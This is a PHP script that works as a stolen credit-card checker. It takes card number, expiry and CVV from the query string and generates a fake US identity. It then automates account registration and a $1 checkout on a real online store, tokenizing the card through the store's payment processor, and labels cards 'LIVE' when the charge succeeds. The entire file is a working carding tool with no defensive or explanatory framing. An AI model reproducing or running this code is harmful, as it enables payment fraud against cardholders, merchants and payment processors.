<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://store.cim.org/en/addproducttocart/details/8787/1',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "addtocart_8787.CustomerEnteredPrice=1&addtocart_8787.EnteredQuantity=1"
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://store.cim.org//en/register?returnUrl=/en/cart',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        )
    ));
    $csrf = GetStr(curl_exec($ch), 'name="__RequestVerificationToken" type="hidden" value="', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://store.cim.org/en/register?returnUrl=/en/cart',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "__RequestVerificationToken=$csrf&customer_attribute_31=599&Gender=M&FirstName=$fname&LastName=$lname&Email=$fname$lname$cookie@gmail.com&Password=ecqcqw%40wecqwecc.com&ConfirmPassword=ecqcqw%40wecqwecc.com&Phone=$phone&Cellphone=&Title=&CompanyId=0&CompanyName=&CompanyCountryId=0&CompanyStateProvinceId=0&CompanyCity=&CompanyAddress1=&CompanyAddress2=&CompanyZipPostalCode=&CompanyPhoneNumber=&CountryId=1&StateProvinceId=9&register-button=Create+an+account"
    ));
    $csrf2 = GetStr(curl_exec($ch), 'name="__RequestVerificationToken" type="hidden" value="', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://store.cim.org/en/cart',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBeu1m0YnFWdCR5AO',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "------WebKitFormBoundaryBeu1m0YnFWdCR5AO\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\n$csrf2\r\n------WebKitFormBoundaryBeu1m0YnFWdCR5AO\r\nContent-Disposition: form-data; name=\"itemquantity47411\"\r\n\r\n1\r\n------WebKitFormBoundaryBeu1m0YnFWdCR5AO\r\nContent-Disposition: form-data; name=\"discountcouponcode\"\r\n\r\n\r\n------WebKitFormBoundaryBeu1m0YnFWdCR5AO\r\nContent-Disposition: form-data; name=\"checkout\"\r\n\r\ncheckout\r\n------WebKitFormBoundaryBeu1m0YnFWdCR5AO--"
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://store.cim.org/en/onepagecheckout',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        )
    ));
    $billId = GetStr(GetStr(curl_exec($ch), 'select name="billing_address_id" id="billing-address-select"', '</select>'), '<option value="', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://store.cim.org/checkout/OpcSaveBilling/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "billing_address_id=$billId&BillingNewAddress.Id=0&BillingNewAddress.FirstName=$fname&BillingNewAddress.LastName=$lname&BillingNewAddress.Email=$fname$lname$cookie@gmail.com&BillingNewAddress.Company=&BillingNewAddress.CountryId=0&BillingNewAddress.StateProvinceId=0&BillingNewAddress.City=&BillingNewAddress.Address1=&BillingNewAddress.Address2=&BillingNewAddress.ZipPostalCode=&BillingNewAddress.PhoneNumber=$phone&BillingNewAddress.FaxNumber="
    ));
    $htp_id = GetStr(curl_exec($ch), 'HPPtoken/index.php?id=', '\u');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www3.moneris.com/HPPtoken/index.php?id='.$htp_id,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        )
    ));
    $htp_ticket = GetStr(curl_exec($ch), "var ticket = '", "'");
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www3.moneris.com/HPPtoken/request.php',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-type: application/x-www-form-urlencoded',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "input_data=$cc&input_exp=$mm".substr($yy, 2, 4)."&input_cvd=$cvv&hpt_id=$htp_id&hpt_ticket=$htp_ticket&doTokenize=true"
    ));
    $key = GetStr(curl_exec($ch), '"dataKey":"', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://store.cim.org/checkout/OpcSavePaymentInfo/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "IsSaveCard=true&IsSaveCard=false&Token=$key"
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://store.cim.org/checkout/OpcConfirmOrder/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "IsSaveCard=true&IsSaveCard=false&Token=$key"
    ));
    $execute = curl_exec($ch);
    curl_close($ch);

    $response = GetStr($execute, 'Payment error: ', '\u');

    if(strpos($execute, '"success":1')){

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged $1</span></td></tr><br>';

    }  else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$response.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
    }
    unlink("cookies/$cookie.txt");
?>
